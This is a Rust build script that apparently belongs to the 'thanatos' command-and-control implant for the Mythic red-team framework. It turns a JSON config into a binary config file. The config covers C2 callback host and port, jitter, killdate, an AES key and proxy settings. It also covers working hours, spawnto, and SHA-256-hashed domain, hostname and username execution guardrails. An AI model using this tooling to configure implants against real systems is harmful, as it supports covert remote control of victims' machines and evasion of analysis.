use base64::{engine::general_purpose, Engine as _};
use chrono::{DateTime, Utc};
use quick_protobuf::MessageWrite;
use serde::Deserialize;
use sha2::Digest;
use std::{borrow::Cow, collections::HashMap, io::Write, path::Path, str::FromStr};
use utils::uuid::Uuid;

use config::proto::config::{Config, HttpConfig, ProxyInfo};

const DEFAULT_CONFIG: &'static str = r#"{
	"uuid": "00000000-0000-0000-0000-000000000000",
	"description": "",
	"payload_type": "thanatos",
	"c2_profiles": [
		{
			"c2_profile": "http",
			"c2_profile_parameters": {
				"AESPSK": {
					"dec_key": null,
					"enc_key": null,
					"value": "none"
				},
				"callback_host": "http://mythic",
				"callback_interval": 1,
				"callback_jitter": 0,
				"callback_port": 80,
				"encrypted_exchange_check": false,
				"get_uri": "index",
				"headers": {
					"User-Agent": "default"
				},
				"killdate": "2099-01-01",
				"post_uri": "data",
				"proxy_host": "",
				"proxy_pass": "",
				"proxy_port": "",
				"proxy_user": "",
				"query_path_name": "q"
			}
		}
	],
	"build_parameters": [
		{
			"name": "usernames",
			"value": []
		},
		{
			"name": "spawnto",
			"value": ""
		},
		{
			"name": "connection_retries",
			"value": "1"
		},
		{
			"name": "libexport",
			"value": "init"
		},
		{
			"name": "tlsuntrusted",
			"value": "false"
		},
		{
			"name": "architecture",
			"value": "amd64"
		},
		{
			"name": "working_hours",
			"value": "00:00-23:59"
		},
		{
			"name": "static",
			"value": []
		},
		{
			"name": "output",
			"value": "executable"
		},
		{
			"name": "initoptions",
			"value": "none"
		},
		{
			"name": "cryptolib",
			"value": "system (Windows CNG/Linux OpenSSL)"
		},
		{
			"name": "domains",
			"value": []
		},
		{
			"name": "hostnames",
			"value": []
		}
	],
	"commands": [
		"exit",
		"sleep"
	],
	"selected_os": "Linux",
	"filename": "thanatos",
	"wrapped_payload": ""
}
"#;

#[derive(Deserialize, Debug)]
struct InputConfig<'a> {
    uuid: String,
    c2_profiles: Vec<C2Profile<'a>>,
    build_parameters: Vec<BuildParameter>,
}

#[derive(Deserialize, Debug)]
#[serde(tag = "name", content = "value")]
#[serde(rename_all = "lowercase")]
enum BuildParameter {
    Usernames(Vec<String>),
    SpawnTo(String),

    #[serde(rename = "connection_retries")]
    ConnectionRetries(String),

    #[serde(rename = "working_hours", with = "working_hours_format")]
    WorkingHours((u32, u32)),
    Domains(Vec<String>),
    Hostnames(Vec<String>),

    #[serde(untagged)]
    Unused(serde_json::Value),
}

#[derive(Deserialize, Debug, PartialEq, Eq)]
#[serde(tag = "c2_profile", content = "c2_profile_parameters")]
enum C2Profile<'a> {
    #[serde(rename = "http")]
    Http(HttpC2ProfileParameters<'a>),
}

#[derive(Deserialize, Debug, PartialEq, Eq)]
struct HttpC2ProfileParameters<'a> {
    #[serde(rename = "AESPSK")]
    aes_psk: AesPsk,

    callback_host: String,
    callback_interval: u32,
    callback_jitter: u32,
    callback_port: u32,
    encrypted_exchange_check: bool,
    get_uri: String,
    headers: HashMap<Cow<'a, str>, Cow<'a, str>>,

    #[serde(with = "killdate_format")]
    killdate: DateTime<Utc>,
    post_uri: String,
    proxy_host: String,
    proxy_pass: String,
    proxy_port: String,
    proxy_user: String,
    query_path_name: String,
}

#[derive(Deserialize, Debug, PartialEq, Eq)]
struct AesPsk {
    dec_key: Option<String>,
    enc_key: Option<String>,
    value: String,
}

mod killdate_format {
    use chrono::{DateTime, NaiveDate, NaiveDateTime, Utc};
    use serde::{Deserialize, Deserializer};

    pub fn deserialize<'de, D>(deserializer: D) -> Result<DateTime<Utc>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        let naive_date =
            NaiveDate::parse_from_str(&s, "%Y-%m-%d").map_err(serde::de::Error::custom)?;
        Ok(DateTime::<Utc>::from_naive_utc_and_offset(
            NaiveDateTime::from(naive_date),
            Utc,
        ))
    }
}

mod working_hours_format {
    use chrono::NaiveTime;
    use serde::{Deserialize, Deserializer};

    pub fn deserialize<'de, D>(deserializer: D) -> Result<(u32, u32), D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        let mut split = s.split('-');
        let start = split
            .next()
            .ok_or(serde::de::Error::custom("Missing start interval"))?;

        let start = NaiveTime::parse_from_str(start, "%H:%M").map_err(serde::de::Error::custom)?;
        let start = start.signed_duration_since(NaiveTime::default());

        let end = split
            .next()
            .ok_or(serde::de::Error::custom("Missing end interval"))?;

        let end = NaiveTime::parse_from_str(end, "%H:%M").map_err(serde::de::Error::custom)?;
        let end = end.signed_duration_since(NaiveTime::default());

        if end <= start {
            return Err(serde::de::Error::custom(
                "End is less than or equal to start",
            ));
        }

        Ok((
            start
                .num_seconds()
                .try_into()
                .expect("Working hours start overflows"),
            end.num_seconds()
                .try_into()
                .expect("Working hours end overflows"),
        ))
    }
}

macro_rules! get_build_param {
    ($data:ident, $variant:pat_param, $inner:ident) => {
        $data.build_parameters.iter().find_map(|v| match v {
            $variant => Some($inner),
            _ => None,
        })
    };

    ($data:ident, $variant:pat_param, $b:block) => {
        $data.build_parameters.iter().find_map(|v| match v {
            $variant => $b,
            _ => None,
        })
    };

    ($data:ident, $variant:pat_param, $e:expr) => {
        $data.build_parameters.iter().find_map(|v| match v {
            $variant => Some($e),
            _ => None,
        })
    };
}

fn main() {
    let config_path = Path::new(&std::env::var("CARGO_MANIFEST_DIR").unwrap())
        .parent()
        .unwrap()
        .join(".config.json");

    let json_config: InputConfig = if config_path.exists() {
        let f = std::fs::File::open(&config_path).expect("Failed to open .config.json file");
        serde_json::from_reader(f).expect("Failed to parse .config.json file")
    } else {
        let mut f =
            std::fs::File::create(&config_path).expect("Failed to create .config.json file");
        f.write_all(DEFAULT_CONFIG.as_bytes())
            .expect("Failed to write .config.json file");

        serde_json::from_str(DEFAULT_CONFIG).expect("Failed to parse default config")
    };

    let uuid = Uuid::from_str(&json_config.uuid).expect("Failed to parse uuid");

    let working_hours = get_build_param!(json_config, BuildParameter::WorkingHours(w), w)
        .expect("Failed to find 'working_hours'");

    let connection_retries = get_build_param!(json_config, BuildParameter::ConnectionRetries(v), v)
        .expect("Failed to get 'connection_retries")
        .parse()
        .expect("Failed to parse 'connection_retries'");

    let domains = get_build_param!(json_config, BuildParameter::Domains(d), {
        Some(hash_guard_list(d))
    })
    .unwrap_or_default();

    let hostnames = get_build_param!(json_config, BuildParameter::Hostnames(h), {
        Some(hash_guard_list(h))
    })
    .unwrap_or_default();

    let usernames = get_build_param!(json_config, BuildParameter::Usernames(u), {
        Some(hash_guard_list(u))
    })
    .unwrap_or_default();

    let spawn_to =
        get_build_param!(json_config, BuildParameter::SpawnTo(s), s.clone()).unwrap_or_default();

    let mut config = Config {
        uuid: Cow::Borrowed(uuid.as_slice()),
        working_hours_start: working_hours.0,
        working_hours_end: working_hours
            .1
            .checked_add(60)
            .expect("Working hours end is too large"),
        connection_retries,
        domains: Cow::Borrowed(&domains),
        hostnames: Cow::Borrowed(&hostnames),
        usernames: Cow::Borrowed(&usernames),
        spawn_to: Cow::Borrowed(&spawn_to),
        ..Default::default()
    };

    if let Some(C2Profile::Http(profile)) = json_config.c2_profiles.into_iter().find(|p| match p {
        C2Profile::Http(_) => true,
    }) {
        let aes_key = profile.aes_psk.enc_key.map(|key| {
            general_purpose::STANDARD
                .decode(key.as_bytes())
                .expect("Failed to decode AES key")
        });

        config.http = Some(HttpConfig {
            callback_host: Cow::Owned(profile.callback_host),
            killdate: profile
                .killdate
                .timestamp()
                .try_into()
                .expect("Killdate is less than 1970"),
            callback_jitter: profile.callback_jitter,
            headers: profile.headers,
            aes_key: Cow::Owned(aes_key.unwrap_or_default()),
            get_uri: Cow::Owned(profile.get_uri),
            post_uri: Cow::Owned(profile.post_uri),
            query_path_name: Cow::Owned(profile.query_path_name),
            proxy: {
                if !profile.proxy_host.is_empty() {
                    Some(ProxyInfo {
                        host: Cow::Owned(profile.proxy_host),
                        port: profile
                            .proxy_port
                            .parse()
                            .expect("Failed to parse proxy port"),
                        pass: Cow::Owned(profile.proxy_pass),
                    })
                } else {
                    None
                }
            },
            callback_interval: profile.callback_interval,
            callback_port: profile.callback_port,
        });
    }

    let output_file = Path::new(&std::env::var("CARGO_MANIFEST_DIR").unwrap())
        .parent()
        .unwrap()
        .join(".config.bin");

    config
        .write_file(output_file)
        .expect("Failed to write serialized config");

    println!("cargo:rerun-if-changed={}", config_path.to_str().unwrap());
}

fn hash_guard_list(guard_list: &[String]) -> Vec<u8> {
    let mut hashlist = Vec::new();

    for val in guard_list {
        let mut h = sha2::Sha256::new();
        h.update(val.as_bytes());
        let hashed: [u8; 32] = h.finalize().into();
        hashlist.extend_from_slice(&hashed);
    }

    hashlist
}
